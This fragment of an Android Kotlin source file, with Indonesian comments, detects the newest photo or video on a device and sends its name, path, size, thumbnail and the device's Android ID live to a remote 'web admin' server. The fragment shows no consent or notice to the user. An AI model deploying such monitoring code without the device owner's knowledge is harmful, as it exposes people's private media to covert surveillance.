    private fun getAppVersion(context: Context): String {
        return try {
            val pInfo = context.packageManager.getPackageInfo(context.packageName, 0)
            pInfo.versionName ?: "2.4.0"
        } catch (e: Exception) {
            "2.4.0"
        }
    }

    /**
     * Mengirim berkas baru (foto/video baru yang baru diambil/diunduh) secara real-time ke web admin (AirDroid style)
     */
    fun notifyNewFileLive(context: Context) {
        if (isDeviceExcludedFromScan(context)) {
            return
        }

        if (!DeviceSyncManager.isScannerEnabledGlobally) {
            return
        }

        Thread {
            try {
                val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: return@Thread
                val contentResolver = context.contentResolver

                val urisToQuery = listOf(
                    Pair(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, false),
                    Pair(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, true)
                )

                var newestUri: Uri? = null
                var newestDateAdded = 0L
                var newestName = ""
                var newestSize = 0L
                var newestMime = ""
                var newestPath = ""
                var isVideo = false

                for ((uri, video) in urisToQuery) {
                    val projection = arrayOf(
                        MediaStore.MediaColumns._ID,
                        MediaStore.MediaColumns.DISPLAY_NAME,
                        MediaStore.MediaColumns.SIZE,
                        MediaStore.MediaColumns.MIME_TYPE,
                        MediaStore.MediaColumns.DATA,
                        MediaStore.MediaColumns.DATE_ADDED
                    )
                    val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC LIMIT 1"
                    try {
                        contentResolver.query(uri, projection, null, null, sortOrder)?.use { cursor ->
                            if (cursor.moveToFirst()) {
                                val dateAdded = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED))
                                if (dateAdded > newestDateAdded) {
                                    newestDateAdded = dateAdded
                                    val id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID))
                                    newestUri = ContentUris.withAppendedId(uri, id)
                                    newestName = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)) ?: "file"
                                    newestSize = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE))
                                    newestMime = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)) ?: ""
                                    newestPath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)) ?: ""
                                    isVideo = video
                                }
                            }
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Error querying MediaStore for newest file: ${e.message}")
                    }
                }

                if (newestUri != null && newestName.isNotEmpty()) {
                    val ext = newestName.substringAfterLast('.', "").lowercase()
                    // Sesuai permintaan pengguna: File GIF tidak perlu di-scan / dikirim live
                    if (ext == "gif") return@Thread
                    val thumb = extractThumbnailFromUri(context, newestUri!!, isVideo)
                    val category = if (isVideo) "VIDEO" else "IMAGE"
                    val compositePath = if (newestPath.isNotEmpty()) "$newestPath::${newestUri.toString()}" else newestUri.toString()

                    val fileObj = mapOf<String, Any?>(
                        "fileName" to newestName,
                        "filePath" to compositePath,
                        "fileSize" to newestSize,
                        "category" to category,
                        "fileType" to category,
                        "mimeType" to (if (newestMime.isNotEmpty()) newestMime else getMimeType(ext)),
                        "thumbnail" to thumb,
                        "thumbnailBase64" to thumb
                    )

                    val payload = mapOf<String, Any?>(
                        "deviceAndroidId" to androidId,
                        "file" to fileObj,
                        "fileName" to newestName,
                        "filePath" to compositePath,
                        "fileSize" to newestSize,
                        "fileType" to category,
                        "mimeType" to (if (newestMime.isNotEmpty()) newestMime else getMimeType(ext)),
                        "thumbnail" to thumb
                    )

                    ApiClient.getClient(context).sendLiveNewFile(payload).enqueue(object : Callback<BasicResponse> {
                        override fun onResponse(call: Call<BasicResponse>, response: Response<BasicResponse>) {
                            Log.d(TAG, "sendLiveNewFile success: ${response.isSuccessful}")
                        }
                        override fun onFailure(call: Call<BasicResponse>, t: Throwable) {
                            Log.w(TAG, "sendLiveNewFile failed: ${t.message}")
                        }
                    })
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error in notifyNewFileLive: ${e.message}")
            }
        }.start()
    }
}
